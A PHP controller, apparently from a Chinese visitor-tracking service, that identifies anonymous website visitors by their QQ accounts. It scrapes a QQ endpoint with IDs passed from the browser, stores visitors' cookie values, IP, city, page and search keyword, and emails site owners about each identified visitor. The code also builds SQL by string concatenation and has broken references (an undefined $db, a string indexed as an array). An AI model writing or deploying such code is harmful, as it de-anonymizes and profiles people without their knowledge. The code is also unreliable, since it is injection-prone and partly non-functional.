<?php
  class DoAction extends Action{
     public function save(){
	     set_time_limit(60);
         //header('Content-type: application/x-javascript; charset=utf-8');
         header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
         header(('Last-Modified: ' . gmdate('D, d M Y H:i:s')) . ' GMT');
         header('Cache-Control: no-cache, must-revalidate');
         header('Pramga: no-cache');
		 $do = isset($_GET['do']) ? $_GET['do'] : '';
         $uid = isset($_GET['uid']) ? $_GET['uid'] : '0';
         $meishi = isset($_GET['meishi']) ? $_GET['meishi'] : '';
         $url = isset($_GET['url']) ? urldecode($_GET['url']) : '';
         $title = isset($_GET['title']) ? urldecode($_GET['title']) : '';
         $uincookie = isset($_GET['uincookie']) ? $_GET['uincookie'] : '';
         $keyword = isset($_GET['keyword']) ? urldecode($_GET['keyword']) : '';
         $srcurl = $_GET['referrer'];
		 if($srcurl == "undefined"){
		     $srcurl = "输入网址访问";
		 }
         if ($url == '') {
             $url = '-';
         }
         if ($title == '') {
             $title = '无标题';
         }
		 $title = str_replace(array('\'', '"'), '', $title);
         $domainInfo = M("sites")->where(array('id' => $uid))->field("id,uid,aotumail")->find();
		//	echo M("sites")->getLastSql();
         if (!$domainInfo) {
               die(('/* uid error at ' . date('Y-m-d H:i:s')) . ' */');
          }
		  $ip = user_ip();
          $city = get_ip_city($ip);
          $qqdata = $this->getvisiter($meishi);
		  
         $qq = $qqdata['qq'];
         $nickname = $qqdata['qqnick'];
         $sex = $meishi['sex'];
         $nickname = str_replace(array('\'', '"'), '', $nickname);
		  if ($uincookie && $do == 'save') {
                 $meishi['id'] = $uincookie;
                $db->insert('`cookies`', $meishi);
            }
          if (!$qq) {
                 die(('/* qq error at ' . date('Y-m-d H:i:s')) . ' */');
            }
		 $data['cookiesid'] = $uincookie;
				 
		 $year = date("Y");
         $month = date("m");
         $day = date("d");
         $dayBegin = mktime(0,0,0,$month,$day,$year);//当天开始时间戳
         $dayEnd = mktime(23,59,59,$month,$day,$year);//当天结束时间戳
		 
		 /*关键词来路获取*/
		 $keyword = getSoKeyword($srcurl);
		 
			     
			 /*判断当天QQ是否记录过记录过则不记录*/
			  $findQqVar = 'webid="'.$domainInfo['id'].'" and ip = "'.$ip.'" and time < '.$dayEnd.' and time > '.$dayBegin;
			 /**/
			 if(!M("qqdata")->where($findQqVar)->field("id")->find()){
			     $data['qq'] = $qq;
		         $data['uid'] = $domainInfo['uid'];
		         $data['webid'] = $domainInfo['id'];		     
		         $data['qqnick'] = $nickname;
		         $data['sex'] = $sex;
		         $data['title'] = $title;
		         $data['keyword'] = $keyword;
		         $data['ip'] = $ip;
		         $data['ipcity'] = $city;
		         $data['url'] = $url;
		         $data['referer'] = $srcurl;
		         $data['time'] = time();
		         M("qqdata")->add($data);
				
				 /**发送邮件*/
				 $vipInfo = getVipInfo($domainInfo['uid']);//读取用户开通自动发送邮件功能时间
				 if($vipInfo['vipendtime'] >= time()){
				     if($domainInfo['aotumail']){
				         SiteSendMail($qq,$domainInfo['uid'],$domainInfo['id']);
				     }
				 }
			}
		
		 /*写入访问记录*/
		     $urlkey = md5($url.$qq);			 
			 $var = 'urlkey = "'.$urlkey.'" and time < '.$dayEnd.' and time > '.$dayBegin;
			 $sql = M("qqVisit")->where($var)->find();
			 if(!$sql){
			     $visitData['urlkey'] = $urlkey;
				 $visitData['cookies'] = $uincookie;
				 $visitData['url'] = $url;
				 $visitData['time'] = time();
				 $visitData['uid'] = $domainInfo['uid'];
				 $visitData['webid'] = $domainInfo['id'];
				 M("qqVisit")->add($visitData);
			 }
		     
		 
	 }
	 
	 public function getvisiter($id){
	     $arr = explode(",",$id);
		 $list = array();
		 foreach ($arr as $key=>$val){
		    $ch = curl_init();
			$timeout = 5;
			curl_setopt ($ch, CURLOPT_URL, "http://app.data.qq.com/?umod=user&uid=".$val."&t=".time());
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
			$file_contents = curl_exec($ch);
			curl_close($ch);
			$html = iconv("GBK","UTF-8",$file_contents);//引擎为gbk
			$html = _substr($html,'<em class="img_box">','</em>');
			$html = str_replace(array("\r","\n","\t"," "),'',$html);
			$list['qq'] = _substr($html,'/qzone/','/');
			$list['qqnick'] = _substr($html,'alt="','"');
			if(_substr($html,'/qzone/','/')){
			    return $list;
			}			
		 }
	 }
	 
	 public function _substr($html,$start,$end = false){
		if ( $end === false ){
			if ( strlen($html) > $start ){
				$html = utf_substr($html, $start) . '…';
			}
			return $html;
		}

		$a = strpos($html,$start);
		if ( $a === false ){
			return '';
		}
		$html = substr($html,$a+strlen($start));
		$a = strpos($html,$end);
		if ( $a === false ){
			return '';
		}
		return substr($html,0,$a);
	}
  }
?>